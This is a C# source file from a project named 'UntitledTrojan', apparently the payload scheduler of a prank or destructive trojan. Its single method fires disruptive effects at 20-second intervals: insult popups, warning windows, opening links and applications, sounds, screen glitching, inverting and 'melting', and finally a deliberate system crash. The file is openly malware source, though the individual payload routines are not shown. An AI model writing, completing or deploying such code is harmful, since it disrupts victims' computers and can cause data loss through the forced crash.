using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan.Tools;

namespace UntitledTrojan.Payloads
{
    internal static class PayloadsManager
    {
        internal static async Task OnTick()
        {
            await Task.Delay(20000);
            Insulting.ShowInsult();
            await Task.Delay(20000);
            DisplayFuck.StartWarnCursor(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartWarn(1000000);
            await Task.Delay(20000);
            if (!Entry.debug) DisplayFuck.StartLinks(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartTextFucker(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartSounds(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartReverse(1000000);
            await Task.Delay(20000);
            if (!Entry.debug) DisplayFuck.StartApps(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartGlitch(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartInvert(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartMelter(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartRecursive(1000000);
            await Task.Delay(20000);
            DisplayFuck.StartScreenGlitch(1000000);
            await Task.Delay(20000);
            Entry.Crash();
        }
    }
}
